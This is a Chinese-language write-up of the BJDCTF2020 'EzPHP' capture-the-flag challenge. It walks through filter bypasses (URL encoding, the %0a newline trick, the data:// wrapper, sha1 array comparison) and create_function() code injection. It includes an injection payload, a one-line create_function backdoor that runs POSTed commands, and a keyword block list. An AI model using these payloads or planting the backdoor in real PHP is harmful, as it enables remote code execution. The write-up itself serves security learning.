# [BJDCTF2020]EzPHP

## 0、知识点

>   `$_SERVER` 函数中`QUERY_STRING`

>    `preg_match`绕过

>   `$_REQUEST`绕过

-   **`$_REQUEST`变量包含了 `$_GET、$_POST 和 $_COOKIE` `的内容。**

>   `file_get_contents`绕过

>   `sha1`比较

>   `create_function()`代码注入，==从**PHP 7.2.0**开始，**create_function()**被废弃==



## 1、关于create_function

**适用范围**：`PHP 4> = 4.0.1`，`PHP 5`，`PHP 7`

>   功能：根据传递的参数**创建匿名函数**，并为其返回唯一名称。
>
>   **create_function()函数会在内部执行 eval()，**
>
>   后面的`return`语句，属于`create_function()`中的第二个参数`string $code`位置。

>   `create_function()`函数在代码审计中，主要用来**查找**项目中的**代码注入**和**回调后门**

```php
// 基础形式
create_function(string $args,string $code)
	// string $args 声明的函数变量部分
	// string $code 执行的方法代码部分

// 正常使用案例(运行时会显示这个方法已弃用)
<?php
    $new = create_function('$a,$b','return $a * $b;');
    echo $new(1,2);
?>
    // 等价以下
    <?php
        function lambda1('$a,$b'){
    		return $a * $b;	
		}
	?>
```

**注入案例**

>   **重点就是：闭合原有的括号，注释末尾的大括号**

```php
<?php
    error_reporting(0);
    $sort_by = $_GET['sort_by'];    // ?sort_by='"]);}phpinfo();/*
    $sorter = 'strnatcasecmp';
    $databases=array('1234','4321');
    $sort_function = ' return 1 * ' .$sorter.'($a["'.$sort_by.'"], $b["'.$sort_by.'"]);';
    echo '<h1>'.$sort_function.'</h>';
	// return 1 * strnatcasecmp($a["'"]);}phpinfo();/*"], $b["'"]);}phpinfo();/*"]);

    usort($databases, create_function('$a, $b', $sort_function));
?>
    # 思路
    # 由于$sort_function是属于create_function的第二个参数，是会被放在代码体中执行，
    # 那么在注入过程中要想办法先闭合【$a["'】,然后再闭合大括号，为什么 要闭合大括号，因为函数实际执行以下
    # function niming($a,$b){
	#	return 1 * ' . $sorter . '($a["' . $sort_by '"]);
	# }
    # phpinfo();/*
	# }
    # 将函数的大括号闭合，就等于跳出了函数体外，可以随意执行代码，最后加个【/*】注释掉后面的东西以避免报错
```

**也可以设置后门**

```php
<?php 
    $func =create_function('',$_POST['cmd']);
	$func();
?>
```

## 2、关于`$_SERVER`

```nginx
# http://localhost/aaa/index.php?p=222&q=333 (多个参数查询)
结果：
	# 获取查询 语句，实例中可知，获取的是?后面的值
$_SERVER['QUERY_STRING'] = "p=222&q=333";
	# 获取 http://localhost 后面的值，包括/
$_SERVER['REQUEST_URI']  = "/aaa/index.php?p=222&q=333";
	# 获取当前脚本的路径，如：index.php
$_SERVER['SCRIPT_NAME']  = "/aaa/index.php";
	# 当前正在执行脚本的文件名
$_SERVER['PHP_SELF']     = "/aaa/index.php";
```



## 3、解题

>   打开题目查看源代码，发现注释，**base32解码得到**`1nD3x.php`

>   

### 一、$_SERVER['QUERY_STRING']

>   `$_SERVER['QUERY_STRING']`**不会进行urldecode**，`$_GET[]`会，**用url编码绕过**
>
>   **说明所有参数需要url编码，才能过这步**

```php
// query string（查询字符串），如果有的话，通过它进行页面访问
if($_SERVER) { 
    if ( preg_match('/shana|debu|aqua|cute|arg|code|flag|system|exec|passwd|ass|eval|sort|shell|ob|start|mail|\$|sou|show|cont|high|reverse|flip|rand|scan|chr|local|sess|id|source|arra|head|light|read|inc|info|bin|hex|oct|echo|print|pi|\.|\"|\'|log/i', $_SERVER['QUERY_STRING'])
        )  
        die('You seem to want to do something bad?'); 
}

```

### 二、正则绕过

>   `preg_match('/^$/')`用换行符`%0a`绕过

```php
if (!preg_match('/http|https/i', $_GET['file'])) {
    if (preg_match('/^aqua_is_cute$/', $_GET['debu']) && $_GET['debu'] !== 'aqua_is_cute') { 
        $file = $_GET["file"]; 
        echo "Neeeeee! Good Job!<br>";
    } 
} else die('fxck you! What do you want to do ?!'); 
```

### 三、$_REQUEST

>   `$_REQUEST`在同时接收`GET`和`POST`参数时，`POST`**优先级更高**，**所有需要post和get同时传参**

```php
if($_REQUEST) { 
    foreach($_REQUEST as $value) { 
        if(preg_match('/[a-zA-Z]/i', $value))  
            die('fxck you! I hate English!'); 
    } 
} 
```

### 四、file_get_contents

>   `file_get_contents`函数，用data伪协议绕过`data://text/plain,debu_debu_aqua`

>   `playload：file=data://text/plain,debu_debu_aqua&debu=aqua_is_cute`

```php
if (file_get_contents($file) !== 'debu_debu_aqua')
    die("Aqua is the cutest five-year-old child in the world! Isn't it ?<br>");
```

### 五、sha1()比较

>   `sha1()`函数无法处理数组，`$shana`和$`passwd`都是数组时都是false。

>   `playload：&shana[]=1&passwd[]=2`

>   **进入这里之后，还需要传入一个数组参数【flag】，用于最后一进行create_function注入**
>
>   **其中`extract()`函数的作用就是将flag数组中的参数导入进来**

```php
if (sha1($shana) === sha1($passwd) && $shana != $passwd ){
    // extract() 从数组中将变量导入到当前的符号表
    extract($_GET["flag"]);
    echo "Very good! you know my password. But what is flag?<br>";
} else{
    die("fxck you! you don't know my password! And you don't know sha1! why you come here!");
}
```

### 六、create_function注入

>   需要构造create_function进行注入，基础的注入方式上面已经介绍过了
>
>   就是首先闭合括号，然后执行函数，然后注释后面的语句，这需要用到的函数有
>
>   `var_dump — 打印变量的相关信息`
>
>   `get_defined_vars() 函数返回由所有已定义变量所组成的数组`

```php
if(preg_match('/^[a-z0-9]*$/isD', $code) || 
preg_match('/过滤条件省略\^/i', $arg) ) { 
    die("<br />Neeeeee~! I have disabled all dangerous functions! You can't get my flag =w="); 
} else { 
    include "flag.php";
    $code('', $arg); 
}
```









参考

https://www.cnblogs.com/luomir/p/5129875.html

https://www.cnblogs.com/-qing-/p/10816089.html

https://www.cnblogs.com/-chenxs/p/11459374.html

https://www.cnblogs.com/rabbittt/p/13323155.html

